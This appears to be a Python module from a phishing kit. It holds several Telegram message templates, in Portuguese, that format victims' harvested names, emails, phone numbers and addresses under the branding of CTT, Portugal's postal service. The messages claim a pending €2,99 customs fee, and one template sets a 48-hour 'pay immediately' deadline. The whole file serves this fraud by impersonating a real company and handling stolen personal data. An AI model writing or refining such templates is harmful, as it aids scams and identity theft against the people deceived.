"""
EXEMPLOS DE TEMPLATES PERSONALIZADOS PARA TELEGRAM
Copie e cole estes exemplos em telegram_templates.py
"""

# TEMPLATE MINIMALISTA
def minimal_template(billing_data):
    return f"""CTT Express
    
Nome: {billing_data.get('nome')}
Email: {billing_data.get('email')}
Endereço: {billing_data.get('endereco')}
Cidade: {billing_data.get('cidade')}

Taxa pendente: €2,99"""

# TEMPLATE COLORIDO (usando emojis coloridos)
def colorful_template(billing_data):
    return f"""🔴🟡🟢 CTT NOTIFICAÇÃO 🟢🟡🔴

🔵 CLIENTE: {billing_data.get('nome')}
🟣 EMAIL: {billing_data.get('email')}  
🟠 TELEFONE: {billing_data.get('telefone')}
🟢 ENDEREÇO: {billing_data.get('endereco')}
🔴 CIDADE: {billing_data.get('cidade')}

⭐ TAXA: €2,99 ⭐"""

# TEMPLATE EMPRESARIAL
def business_template(billing_data):
    return f"""═══════════════════════════════
        CTT CORREIOS S.A.
═══════════════════════════════

NOTIFICAÇÃO DE ENCOMENDA #{random.randint(1000,9999)}

DESTINATÁRIO:
{billing_data.get('nome')}
{billing_data.get('endereco')}
{billing_data.get('codigoPostal')} {billing_data.get('cidade')}

CONTACTO: {billing_data.get('telefone')}
EMAIL: {billing_data.get('email')}

TAXA ALFANDEGÁRIA: €2,99
ESTADO: PENDENTE

Para mais informações: suporte@ctt.pt
═══════════════════════════════"""

# TEMPLATE COM BARRAS DE PROGRESSO
def progress_template(billing_data):
    return f"""📦 CTT - RASTREAMENTO

{billing_data.get('nome')}

PROGRESSO:
▓▓▓▓▓▓▓░░░ 70%

✅ Encomenda recebida
✅ Em processamento  
✅ Taxa calculada
⏳ Aguarda pagamento
⏳ Preparação para envio
⏳ Em trânsito
⏳ Entregue

TAXA: €2,99"""

# TEMPLATE ASCII ART
def ascii_template(billing_data):
    return f"""
╔═══════════════════════════════╗
║           🚚 CTT 🚚            ║
╠═══════════════════════════════╣
║ Nome: {billing_data.get('nome')[:20]:<20} ║
║ Email: {billing_data.get('email')[:19]:<19} ║  
║ Cidade: {billing_data.get('cidade')[:18]:<18} ║
║                               ║
║ 💰 Taxa: €2,99               ║
╚═══════════════════════════════╝"""

# TEMPLATE URGENTE
def urgent_template(billing_data):
    return f"""🚨🚨🚨 URGENTE 🚨🚨🚨

⚠️ TAXA ALFANDEGÁRIA PENDENTE ⚠️

Cliente: {billing_data.get('nome')}
Email: {billing_data.get('email')}
Endereço: {billing_data.get('endereco')}

💸 VALOR: €2,99
⏰ PRAZO: 48 HORAS

🚨 PAGUE IMEDIATAMENTE 🚨
🚨🚨🚨 URGENTE 🚨🚨🚨"""